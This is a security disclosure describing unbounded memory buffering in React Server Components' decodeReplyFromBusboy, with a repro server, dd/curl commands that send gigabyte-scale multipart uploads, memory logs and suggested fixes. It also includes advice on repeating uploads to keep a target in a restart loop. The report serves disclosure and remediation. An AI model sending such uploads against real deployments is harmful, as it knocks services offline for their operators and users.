# Unbounded memory buffering in `decodeReplyFromBusboy` allows unauthenticated multipart upload DoS (RSC)

## Summary

A remote attacker can trigger deterministic memory exhaustion in servers using React Server Components multipart reply decoding. `decodeReplyFromBusboy()` buffers uploaded file parts entirely in memory (external/native buffers) with no size bound before application code executes, making it a framework-level DoS primitive. In memory-capped environments (containers/serverless), a single unauthenticated request reliably causes request failure and sustained memory pressure.

Many frameworks and custom RSC deployments expose server actions endpoints publicly; this provides an unauthenticated DoS vector when those endpoints accept multipart bodies and call decodeReplyFromBusboy.

## Root Cause

In `react-server`, multipart file parts are accumulated without a byte cap:

* `ReactFlightReplyServer.js` creates `chunks: []` for each file handle, appends all chunks (`handle.chunks.push(chunk)`), then materializes a full `Blob(handle.chunks, ...)`.
* The Node multipart decoder feeds attacker-controlled chunks into this sink via `resolveFileInfo` → `resolveFileChunk` (per data event) → `resolveFileComplete`.
* This behavior is production-relevant (no `__DEV__` gating).

## Impact

* Forces memory allocation proportional to attacker-controlled upload size before user handlers can reject the request.
* In memory-restricted deployments, drives the process to its memory ceiling and causes request failure; attackers can repeat requests to keep instances unhealthy (restart loops / autoscaling exhaustion).
* Upstream limits (proxy/busboy) mitigate only if correctly configured; React's decode API currently provides no built-in bound and behaves as an unsafe sink by default.
* Even with streaming multipart parsing (Busboy), the React decode layer itself buffers file parts into memory by design; therefore the unsafe behavior exists unless every integration configures explicit file/body size limits upstream.


## Attack Vector

- Remote exploitation possible
- No authentication required
- Single malicious request sufficient to trigger resource exhaustion

## Environment

* Node version: v24.13.0
* OS: Linux
* Package versions:
  `
[keshavgoyal@hazelnut rsc-file-dos]$ npm ls react react-dom react-server-dom-webpack busboy
rsc-file-dos@1.0.0 /tmp/rsc-file-dos
├── busboy@1.6.0
├─┬ react-dom@19.2.4
│ └── react@19.2.4 deduped
├─┬ react-server-dom-webpack@19.2.4
│ ├── react-dom@19.2.4 deduped
│ └── react@19.2.4 deduped
└── react@19.2.4
`

## Step-by-Step Reproduction
Preconditions: a Node server endpoint that accepts multipart/form-data and uses decodeReplyFromBusboy(...) (directly or via a framework integration) without strict upstream body/file size limits.

Create a minimal repro server (separate folder is easiest):

```bash
mkdir -p /tmp/rsc-file-dos && cd /tmp/rsc-file-dos
npm init -y
npm i react react-dom react-server-dom-webpack busboy
```

Create server.mjs:

```js
import http from "node:http";
import Busboy from "busboy";

// IMPORTANT: import the ESM entry (not CJS require) so export conditions can apply.
import { decodeReplyFromBusboy } from "react-server-dom-webpack/server.node";

const webpackMap = {};

function mb(n) { return Math.round(n / 1024 / 1024); }

http.createServer((req, res) => {
  if (req.method !== "POST") {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("POST a multipart body\n");
    return;
  }

  const started = Date.now();
  const bb = Busboy({ headers: req.headers });

  const root = decodeReplyFromBusboy(bb, webpackMap);

  let bytesIn = 0;
  req.on("data", (buf) => (bytesIn += buf.length));

  const memTimer = setInterval(() => {
    const m = process.memoryUsage();
    console.log(
      `[+${((Date.now()-started)/1000).toFixed(1)}s] ` +
      `in=${mb(bytesIn)}MB rss=${mb(m.rss)}MB heapUsed=${mb(m.heapUsed)}MB ext=${mb(m.external)}MB`
    );
  }, 250);

  bb.on("finish", async () => {
    clearInterval(memTimer);
    try { await root; }
    catch (e) { console.error("root rejected:", e?.name, e?.message); }
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("done\n");
  });

  req.pipe(bb);
}).listen(3000, "127.0.0.1", () => {
  console.log("listening on http://127.0.0.1:3000");
});



```
Run it:

```bash
node --conditions=react-server server.mjs
```
Generate a large file (pick a size that will exceed your Node memory limit):

```bash
dd if=/dev/zero of=big.bin bs=10M count=300  # ~3GB
```


Send the attack request:

```bash
curl -F "file=@big.bin" http://127.0.0.1:3000/
```

Verify exploitation:
Watch the server logs: rss should climb roughly with upload size. Observe external and RSS grow roughly linearly with uploaded bytes; on typical container/serverless limits this causes request failure and service degradation, and may trigger process termination depending on memory limits.

RSS/external grow linearly; this causes request failure and/or process termination depending on memory limits.”

## Exploit chain / amplification
Practical chaining is "DoS amplification": if the target has an auto-restart supervisor, repeating the upload keeps it in a restart loop. If your app also has expensive per-request work after decode, this becomes even easier to sustain.




Diffferent tests and outputs:

The server.mjs file is same but the attach payload is different.

### Test 1: 

Run the server.mjs
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ node --conditions=react-server --max-old-space-size=256 server.mjs
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big.bin bs=10M count=300   # ~3GB
300+0 records in
300+0 records out
3145728000 bytes (3.1 GB, 2.9 GiB) copied, 1.38812 s, 2.3 GB/s
[keshavgoyal@hazelnut react]$ curl -F "file=@big.bin" http://127.0.0.1:3000/
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ node --conditions=react-server --max-old-space-size=256 server.mjs
listening on http://127.0.0.1:3000
[+0.3s] in=176MB rss=224MB heapUsed=9MB ext=179MB
[+0.5s] in=354MB rss=403MB heapUsed=8MB ext=357MB
[+0.8s] in=554MB rss=606MB heapUsed=9MB ext=557MB
[+1.0s] in=758MB rss=812MB heapUsed=9MB ext=761MB
[+1.3s] in=962MB rss=1018MB heapUsed=10MB ext=965MB
[+1.5s] in=1168MB rss=1225MB heapUsed=11MB ext=1171MB
[+1.8s] in=1372MB rss=1431MB heapUsed=11MB ext=1375MB
[+2.0s] in=1576MB rss=1636MB heapUsed=12MB ext=1579MB
[+2.3s] in=1786MB rss=1847MB heapUsed=13MB ext=1789MB
[+2.5s] in=1992MB rss=2055MB heapUsed=13MB ext=1995MB
[+2.8s] in=2196MB rss=2261MB heapUsed=14MB ext=2199MB
[+3.0s] in=2400MB rss=2466MB heapUsed=14MB ext=2403MB
[+3.3s] in=2606MB rss=2674MB heapUsed=15MB ext=2609MB
[+3.5s] in=2810MB rss=2880MB heapUsed=16MB ext=2813MB

```
Observed: RSS and `external` increase roughly linearly with upload size while heapUsed stays small (external/native buffering).
Note: growth is primarily in process.memoryUsage().external, so V8 heap limits do not mitigate.

---
### Test 2: 

Run the server.mjs (same file as before)
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r563cc5e07efc4baaa82343786dc57f15.scope
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big-600m.bin bs=1M count=600
curl -F "file=@big-600m.bin" http://127.0.0.1:3000/
600+0 records in
600+0 records out
629145600 bytes (629 MB, 600 MiB) copied, 0.274313 s, 2.3 GB/s
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r563cc5e07efc4baaa82343786dc57f15.scope
listening on http://127.0.0.1:3000
[+0.3s] in=172MB rss=217MB heapUsed=7MB ext=175MB
[+0.5s] in=362MB rss=407MB heapUsed=8MB ext=365MB
[+1.0s] in=378MB rss=390MB heapUsed=8MB ext=381MB
[+1.2s] in=386MB rss=389MB heapUsed=8MB ext=389MB
[+1.4s] in=400MB rss=392MB heapUsed=8MB ext=403MB
[+2.2s] in=424MB rss=392MB heapUsed=8MB ext=427MB
[+2.4s] in=452MB rss=395MB heapUsed=8MB ext=455MB
[+2.7s] in=480MB rss=395MB heapUsed=8MB ext=483MB
[+2.9s] in=508MB rss=398MB heapUsed=8MB ext=511MB
[+3.2s] in=534MB rss=402MB heapUsed=8MB ext=537MB
[+3.5s] in=564MB rss=402MB heapUsed=8MB ext=567MB
[+3.7s] in=594MB rss=404MB heapUsed=9MB ext=597MB
root rejected: Error Connection closed.

```


```bash
[keshavgoyal@hazelnut react]$ cg=$(systemctl --user show -p ControlGroup --value run-r563cc5e07efc4baaa82343786dc57f15.scope)
cat /sys/fs/cgroup${cg}/memory.max
cat /sys/fs/cgroup${cg}/memory.current
cat /sys/fs/cgroup${cg}/memory.events
419430400
418742272
low 0
high 0
max 5608
oom 0
oom_kill 0
oom_group_kill 0
```

Running the server under a 400 MiB cgroup limit (`MemoryMax=400M`) and uploading a 600 MiB multipart file causes React's multipart reply decode to push the process to the memory ceiling and repeatedly hit the limit.

## Observed Behavior During Upload

- `process.memoryUsage().external` increased roughly linearly with bytes received
- `heapUsed` remained at approximately 7–9 MB
- RSS climbed until pinned around 400 MB
- The decode promise then failed with: `root rejected: Error Connection closed.`

## Cgroup Evidence After Request
```
memory.max: 419430400
memory.current: 418742272
memory.events: max 5608
```

The `memory.events` counter shows 5608 allocation failures due to `MemoryMax` being reached.

# Suggested Fix

The decoding API should enforce a bounded buffering policy. Possible fixes:

* Add `maxFileSize` / `maxTotalBytes` options to `decodeReplyFromBusboy`
* Abort decoding when exceeded
* Alternatively stream file parts instead of constructing `Blob(chunks)`

The framework should not perform unbounded buffering of attacker-controlled input by default.
